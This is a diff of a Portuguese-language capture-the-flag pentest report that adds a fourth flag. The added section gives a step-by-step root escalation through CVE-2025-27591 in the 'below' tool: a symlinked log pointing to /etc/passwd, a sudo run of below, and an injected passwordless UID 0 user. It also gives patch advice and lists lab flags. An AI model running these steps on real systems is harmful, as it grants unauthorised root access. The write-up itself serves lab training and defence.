@@ -3,9 +3,9 @@
 ## Informações Gerais
 
 **Data de Execução:** 14 de fevereiro de 2026  
-**Alvo Principal:** 98.86.169.119 (ec2-98-86-169-119.compute-1.amazonaws.com)  
-**Banco de Dados MySQL:** 13.220.129.145 (ec2-13-220-129-145.compute-1.amazonaws.com)  
-**Total de Flags:** 3 flags encontradas de 4 
+**Alvo Principal:**  (ec2-98-86-169-119.compute-1.amazonaws.com)  
+**Banco de Dados MySQL:**  (ec2-13-220-129-145.compute-1.amazonaws.com)  
+**Total de Flags:** 4 flags capturadas (módulo concluído com sucesso) 
 ***Dica da plataforma:***"Ariel Cardoso respirou fundo antes de abrir o ticket. 
 
 Recém-contratado como pentester na RedGuardSec, ele ainda estava naquela fase em que cada demanda parecia um labirinto sem fim. E essa não era qualquer demanda: a Rede Blogo, um dos maiores conglomerados de mídia do país, havia sofrido um ataque cibernético e vos queriam respostas rápidas. 
@@ -29,7 +29,7 @@ A missão é clara: tratar o ambiente como uma cena de crime onde alguém apagou
 
 ### 1.1 Scan de Portas (Nmap)
 
-**Alvo:** 98.86.169.119
+**Alvo:** 
 
 **Portas Abertas:**
 - **Porta 25/tcp** - SMTP (filtrada)
@@ -358,13 +358,12 @@ Foram realizadas várias tentativas de usar o comando `below` para ler arquivos 
    ```
    Resultado: Erros de parsing - o comando espera um formato específico de snapshot, não arquivos arbitrários
 
-**Conclusão:** O comando `below` não pode ser explorado diretamente para leitura de arquivos arbitrários devido às suas validações internas e formato específico de dados.
+**Conclusão inicial:** Tentativas diretas de usar `below dump --snapshot` para ler arquivos arbitrários falharam. A escalação para root foi obtida explorando a **CVE-2025-27591** (symlink no logger do below), conforme descrito na seção 2.4.
 
 **Arquivo de Configuração Sudoers:**
 - Localização: `/etc/sudoers.d/adalberto-below`
 - Permissões: `-r--r-----` (root:root)
-- Conteúdo não acessível diretamente devido a permissões restritivas
-- Configuração específica permite execução do comando `below` com restrições
+- Configuração específica permite execução do comando `below` com restrições (sem `--config`, `--debug`, `-d*`)
 
 **Recomendações:**
 - Implementar políticas de senha únicas para cada serviço/usuário
@@ -373,10 +372,88 @@ Foram realizadas várias tentativas de usar o comando `below` para ler arquivos 
 - Implementar rotação de senhas regular
 - Usar autenticação de dois fatores quando possível
 - Remover arquivos de backup de diretórios web públicos
+- Atualizar o binário **below** para versão ≥ 0.9.0 para mitigar CVE-2025-27591
 
 ---
 
-### 2.4 Exploração do Banco de Dados MySQL
+### 2.4 Flag 4: Escalação para Root via CVE-2025-27591 (Below Symlink)
+
+**Localização:** `/root/flag.txt`  
+**Tipo de Vulnerabilidade:** Escalação de Privilégios Local (CVE-2025-27591)  
+**Severidade:** Crítica
+
+**Descrição:**
+A quarta flag foi obtida após escalação de privilégios de `adalberto` para **root**, explorando a vulnerabilidade **CVE-2025-27591** na ferramenta **below** (versão &lt; 0.9.0). O below, ao rodar como root, trata o arquivo de log como arquivo normal e aplica permissão **0666** nele. Se esse "log" for um **symlink** para `/etc/passwd`, o root acaba tornando `/etc/passwd` gravável por qualquer usuário, permitindo injetar um usuário com UID 0 e obter shell root.
+
+**Flag Encontrada:**
+```
+Solyd{U$G0T$R007%Congrats!!!!}
+```
+
+**Pré-requisitos utilizados:**
+- Acesso ao usuário `adalberto` (shell no servidor)
+- Sudo restrito: adalberto pode executar apenas `/usr/local/bin/below` com sudo
+- Diretório `/var/log/below` existente e **world-writable (0777)**
+
+**Processo de Exploração (passo a passo):**
+
+1. **Remover o arquivo de log** (adalberto pode, pois o diretório é 0777):
+   ```bash
+   rm -f /var/log/below/error_root.log
+   ```
+
+2. **Criar symlink do "log" para /etc/passwd:**
+   ```bash
+   ln -s /etc/passwd /var/log/below/error_root.log
+   ```
+
+3. **Rodar below como root** (único comando sudo permitido):
+   ```bash
+   sudo /usr/local/bin/below record &
+   ```
+   O below sobe em background; ao abrir o "log", aplica **0666** no alvo do symlink (`/etc/passwd`).
+
+4. **Deixar o below rodar e parar:**
+   ```bash
+   sleep 3
+   kill %1
+   ```
+
+5. **Verificar que /etc/passwd ficou gravável:**
+   ```bash
+   ls -la /etc/passwd   # -rw-rw-rw- (0666)
+   ```
+
+6. **Injetar usuário root em /etc/passwd** (sem sudo):
+   ```bash
+   echo '0xdtc::0:0:0xdtc:/root:/bin/bash' >> /etc/passwd
+   ```
+
+7. **Entrar como o novo usuário root** (senha vazia):
+   ```bash
+   su 0xdtc
+   # Enter na senha
+   ```
+
+8. **Ler a flag:**
+   ```bash
+   cat /root/flag.txt
+   ```
+
+**Referências CVE:**
+- **CVE:** [CVE-2025-27591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-27591)
+- **RUSTSEC:** RUSTSEC-2025-0149
+- **GHSA:** GHSA-9mc5-7qhg-fp3w
+- Documentação local: `RESUMO_ESCALACAO_ROOT_CVE-2025-27591.md`, `CVE-2025-27591_BELOW_REFERENCIAS.md`
+
+**Recomendações:**
+- Atualizar o binário **below** para versão ≥ 0.9.0
+- Evitar diretórios de log world-writable quando o processo roda como root
+- Revisar permissões de sudo para ferramentas que manipulam arquivos de log
+
+---
+
+### 2.5 Exploração do Banco de Dados MySQL
 
 **Tipo de Vulnerabilidade:** Configuração Restritiva de Banco de Dados  
 **Severidade:** Informacional
@@ -459,7 +536,7 @@ O usuário `blogodb` possui credenciais válidas, mas privilégios extremamente 
 | 4 | Reutilização de Senhas | Alta | Comprometimento de Múltiplos Sistemas | ✅ Explorada |
 | 5 | Arquivo de Backup Acessível Publicamente | Média | Exposição de Credenciais | ✅ Explorada |
 | 6 | Webshell Existente no Sistema | Crítica | Backdoor Persistente | ⚠️ Identificada |
-| 7 | Privilégios Sudo Limitados Mal Configurados | Média | Possível Vetor de Escalação | ⚠️ Identificada |
+| 7 | Privilégios Sudo + CVE-2025-27591 (below) | Crítica | Escalação para Root | ✅ Explorada |
 | 8 | Privilégios MySQL Restritivos | Baixa | Limitação de Acesso ao Banco | ✅ Explorada |
 
 ### 3.2 Análise Detalhada
@@ -488,6 +565,12 @@ O usuário `blogodb` possui credenciais válidas, mas privilégios extremamente 
 - **Complexidade:** Baixa
 - **Impacto:** Escalação de privilégios, acesso a múltiplos sistemas
 
+#### Vulnerabilidade 7: CVE-2025-27591 (Below Symlink)
+- **CVSS Score Estimado:** 7.8 (Alto)
+- **Vetor de Ataque:** Local (requer usuário com sudo para below)
+- **Complexidade:** Baixa (diretório de log world-writable + symlink)
+- **Impacto:** Escalação para root; leitura/gravação de arquivos sensíveis (ex.: /etc/passwd)
+
 ---
 
 ## 4. Ferramentas e Técnicas Utilizadas
@@ -507,7 +590,8 @@ O usuário `blogodb` possui credenciais válidas, mas privilégios extremamente 
 - **LinPEAS:** Enumeração de escalação de privilégios
 - **Comandos Nativos Linux:** Enumeração manual do sistema
 - **MySQL Client:** Exploração do banco de dados MySQL
-- **Below:** Ferramenta de monitoramento de sistema (versão 0.8.1)
+- **Below:** Ferramenta de monitoramento de sistema (versão 0.8.1) — explorada via CVE-2025-27591 (symlink no logger)
+- **Exploit CVE-2025-27591:** Passo a passo manual (symlink `error_root.log` → `/etc/passwd`, `sudo below record`, injeção de usuário 0xdtc); referências em repositórios públicos (ex.: 0xDTC/Below-Logger-Symlink-Attack_CVE-2025-27591)
 
 ---
 
@@ -564,7 +648,11 @@ Solyd{Its*Always*Easier*To*Have*One*Strong*Password}
 **Método:** Credenciais Expostas → Escalação de Privilégios
 
 ### Flag 4
-**Status:** Não encontrada
+```
+Solyd{U$G0T$R007%Congrats!!!!}
+```
+**Localização:** `/root/flag.txt`  
+**Método:** Escalação para root via CVE-2025-27591 (below symlink → /etc/passwd gravável → usuário 0xdtc UID 0)
 
 ---
 
@@ -604,9 +692,11 @@ Solyd{Its*Always*Easier*To*Have*One*Strong*Password}
    - Testes de penetração regulares
 
 3. **Hardening do Sistema:**
+   - Atualizar **below** para versão ≥ 0.9.0 (mitigar CVE-2025-27591)
    - Remover capabilities desnecessárias do container
    - Implementar princípio do menor privilégio
    - Configurar logging e monitoramento
+   - Evitar diretórios de log world-writable para processos que rodam como root
 
 4. **Gerenciamento de Segredos:**
    - Implementar serviço de gerenciamento de segredos (ex: HashiCorp Vault)
@@ -643,18 +733,27 @@ Solyd{Its*Always*Easier*To*Have*One*Strong*Password}
 
 5. **Defesa em Profundidade:** Múltiplas camadas de segurança são necessárias para proteger sistemas críticos.
 
+6. **CVE e Symlink em Ferramentas de Sistema:** Ferramentas que rodam como root e escrevem em arquivos de log com permissões amplas (0666) em diretórios graváveis podem ser exploradas via symlink (CVE-2025-27591 no below); manter componentes atualizados e evitar diretórios de log world-writable.
+
 ---
 
 ## 9. Conclusão
 
-Este CTF demonstrou uma cadeia de vulnerabilidades que permitiu progressão desde a descoberta de informação exposta até a escalação de privilégios no sistema. As vulnerabilidades identificadas são comuns em ambientes de produção e destacam a importância de:
+Este CTF demonstrou uma cadeia de vulnerabilidades que permitiu progressão desde a descoberta de informação exposta até a **escalação completa para root** e captura das **quatro flags**. As vulnerabilidades identificadas são comuns em ambientes de produção e destacam a importância de:
 
 - Validação rigorosa de entrada
 - Proteção adequada de credenciais
 - Implementação de princípios de segurança em todas as camadas
+- Atualização de componentes (below e CVE-2025-27591)
 - Monitoramento e resposta a incidentes
 
-A exploração bem-sucedida de 3 flags demonstra a eficácia de uma abordagem sistemática de teste de penetração, começando com reconhecimento básico e progredindo através de exploração e pós-exploração. A quarta flag não foi localizada durante esta fase de exploração.
+**Fechamento do módulo:** As 4 flags foram capturadas com sucesso:
+1. **Flag 1** — Comentário HTML em `noticias.php`
+2. **Flag 2** — LFI → RCE → shell reversa → `/flag.txt`
+3. **Flag 3** — Credenciais em backup → reutilização de senha → usuário adalberto → `/home/adalberto/flag.txt`
+4. **Flag 4** — Sudo do adalberto (below) + CVE-2025-27591 (symlink no logger) → `/etc/passwd` gravável → usuário 0xdtc (UID 0) → `/root/flag.txt`
+
+A exploração bem-sucedida das 4 flags demonstra a eficácia de uma abordagem sistemática de teste de penetração: reconhecimento, exploração web, pós-exploração, reutilização de credenciais e exploração de CVE para escalação final.
 
 ---
 
@@ -671,14 +770,17 @@ A exploração bem-sucedida de 3 flags demonstra a eficácia de uma abordagem si
 - `nmap` - Resultados completos do scan de portas
 - `Mysql.txt` - Tentativas de conexão ao MySQL
 - `credecial.txt` - Descoberta de credenciais
-- `flags.txt` - Documentação das flags encontradas
+- `flags.txt` - Documentação das flags encontradas (inclui as 4 flags)
 - `linpeasAdalberto.txt` - Resultados da enumeração LinPEAS
 - `98.86.169.119` - Código-fonte da página inicial
 - `98.86.169.119-noticias-php` - Código-fonte da página de notícias
-
+- `RESUMO_ESCALACAO_ROOT_CVE-2025-27591.md` - Passo a passo da escalação para root via CVE-2025-27591
+- `CVE-2025-27591_BELOW_REFERENCIAS.md` - Referências e links do CVE (below)
+- `ANALISE_COLETA_SCRIPT.md` - Análise do que foi coletado com script (rede, Apache, MySQL, exploit)
 
 ---
 
 **Relatório Gerado em:** 14 de fevereiro de 2026  
+**Atualizado em:** 10 de março de 2026  
 **Autor:** Análise de CTF9  
-**Versão:** 1.0
+**Versão:** 2.0 — Módulo concluído com captura das 4 flags
